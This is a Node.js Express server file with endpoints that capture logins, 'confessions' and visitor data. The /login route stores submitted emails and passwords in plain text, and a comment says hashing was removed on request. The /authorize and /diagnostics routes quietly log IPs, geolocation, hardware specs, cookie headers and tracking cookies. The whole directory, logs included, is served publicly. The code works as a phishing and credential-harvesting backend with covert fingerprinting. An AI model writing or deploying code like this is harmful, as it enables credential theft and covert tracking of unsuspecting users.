const express = require("express");
const fs = require("fs");
const path = require("path");
// removed hashing: storing raw passwords as requested

const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the files in the public folder
app.use(express.static(__dirname));

// Migrate old ips.txt into information.txt if present
try {
    const ipsPath = path.join(__dirname, 'ips.txt');
    const infoPath = path.join(__dirname, 'information.txt');
    if (fs.existsSync(ipsPath)) {
        const data = fs.readFileSync(ipsPath, 'utf8');
        const header = `Migrated from ips.txt on ${new Date().toLocaleString()}\n\n`;
        fs.appendFileSync(infoPath, header + data + '\n');
        fs.unlinkSync(ipsPath);
        console.log('Migrated ips.txt -> information.txt');
    }
} catch (e) {
    console.error('Migration error:', e);
}

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", (req, res) => {
    const { confession } = req.body;

    const entry =
`Time: ${new Date().toLocaleString()}

Confession:
${confession}

--------------------------------

`;

    fs.appendFile(
        path.join(__dirname, "confessions.txt"),
        entry,
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send("Error saving confession.");
            }

            res.send("Saved!");
        }
    );
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});

app.post("/login", (req, res) => {
    const { email, password } = req.body;

    const entry =
`Time: ${new Date().toLocaleString()}

Email: ${email}
Password: ${password}

--------------------------------

`;

    fs.appendFile(
        path.join(__dirname, "logins.txt"),
        entry,
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send("Error saving login.");
            }

            res.send("Saved!");
        }
    );
});

app.post('/authorize', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip) + '';

    const body = req.body || {};

    const cookieHeader = req.get('cookie') || 'N/A';

    const geoLocation = body.geoLocation || 'N/A';
    const timezone = body.timezone || (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || 'N/A';
    const userAgent = body.userAgent || req.get('User-Agent') || 'N/A';
    const hardwareSpecs = body.hardwareSpecs ? JSON.stringify(body.hardwareSpecs) : 'N/A';
    const internalState = body.internalState ? JSON.stringify(body.internalState) : 'N/A';
    const referrer = req.get('referer') || body.referrer || 'N/A';
    const cookies = body.cookies || 'N/A';

    const entry =
`Time: ${new Date().toLocaleString()}

IP Address: ${ip}
Geographic Location: ${typeof geoLocation === 'string' ? geoLocation : JSON.stringify(geoLocation)}
Time Zone: ${timezone}
User-Agent String: ${userAgent}
Hardware Specs: ${hardwareSpecs}
Internal State: ${internalState}
Referrer header: ${referrer}
Tracking cookies: ${cookies}
Cookie Header: ${cookieHeader}

--------------------------------

`;

    fs.appendFile(
        path.join(__dirname, 'information.txt'),
        entry,
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Error saving information.');
            }

            res.send('Saved!');
        }
    );
});

app.post('/diagnostics', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip) + '';
    const headers = req.headers || {};
    const body = req.body || {};

    const entry =
`Time: ${new Date().toLocaleString()}

IP: ${ip}
Headers: ${JSON.stringify(headers)}
Diagnostics: ${JSON.stringify(body, null, 2)}

--------------------------------

`;

    fs.appendFile(
        path.join(__dirname, 'diagnostics.txt'),
        entry,
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Error saving diagnostics.');
            }

            res.send('Saved!');
        }
    );
});